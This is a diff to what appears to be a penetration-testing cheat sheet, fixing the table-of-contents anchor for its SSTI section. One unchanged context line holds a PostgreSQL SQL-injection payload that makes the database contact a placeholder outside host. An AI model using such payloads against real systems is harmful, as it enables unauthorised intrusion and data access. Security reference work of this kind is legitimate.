@@ -50,7 +50,7 @@
   - [SMTP Header Injection](#SMTP-Header-Injection)
   - [Reverse Shell](#Reverse-Shell)
   - [SQLi (SQL Injection)](#SQLi-Manual)
-  - [SSTI (Server Side Template Injection)](#SSTI-(Server-Side-Template-Injection))
+  - [SSTI (Server Side Template Injection)](#SSTI)
   - [WebDAV (Web Distributed Authoring and Versioning)](#WebDAV-(Web-Distributed-Authoring-and-Versioning))
   - [Generic Tools](#Generic-Tools)
   - [General](#General)
@@ -712,7 +712,7 @@ https://arxiv.org/abs/1303.3047
 <br># PostgreSQL
 <br>```'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'```
 
-### SSTI (Server Side Template Injection)
+### <a name="SSTI"></a>SSTI (Server Side Template Injection)
 https://www.youtube.com/watch?v=SN6EVIG4c-0
 <br># Template Injections (SSTI) in 10 minutes
 
